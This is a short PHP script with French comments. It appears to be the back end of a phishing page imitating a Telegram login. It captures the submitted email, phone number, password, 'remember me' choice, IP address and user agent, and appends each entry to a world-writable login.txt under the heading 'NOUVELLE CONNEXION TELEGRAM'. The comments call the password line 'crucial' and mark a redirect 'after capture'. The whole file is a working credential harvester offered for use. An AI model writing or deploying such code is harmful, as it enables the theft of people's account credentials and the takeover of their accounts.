<?php
// Active l'affichage de toutes les erreurs pour le débogage
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Vérifie si le formulaire a été soumis en POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = "login.txt";
    
    // 1. Création du fichier s'il n'existe pas
    if (!file_exists($file)) {
        file_put_contents($file, "");
        chmod($file, 0777); // Donne toutes les permissions
    }

    // 2. Vérification des permissions
    if (!is_writable($file)) {
        die("Erreur : Permission refusée. Exécutez: chmod 777 login.txt");
    }

    // 3. Récupération sécurisée des données
    $data = "\n=== NOUVELLE CONNEXION TELEGRAM ===\n";
    $data .= "Date: " . date('Y-m-d H:i:s') . "\n";
    $data .= "Email: " . htmlspecialchars($_POST['username'] ?? 'Non fourni') . "\n";
    $data .= "Téléphone: " . htmlspecialchars($_POST['country_code'] ?? '') . htmlspecialchars($_POST['phone_number'] ?? '') . "\n";
    $data .= "Mot de passe: " . htmlspecialchars($_POST['password'] ?? 'Non fourni') . "\n"; // Ligne cruciale
    $data .= "Session active: " . (isset($_POST['remember']) ? 'Oui' : 'Non') . "\n";
    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $data .= "================================\n";

    // 4. Écriture des données
    if (file_put_contents($file, $data, FILE_APPEND)) {
        // Redirection après capture
        
    } else {
        die("Erreur d'écriture. Vérifiez les permissions.");
    }
} else {
    die("Accès invalide : requête non POST");
}
?>
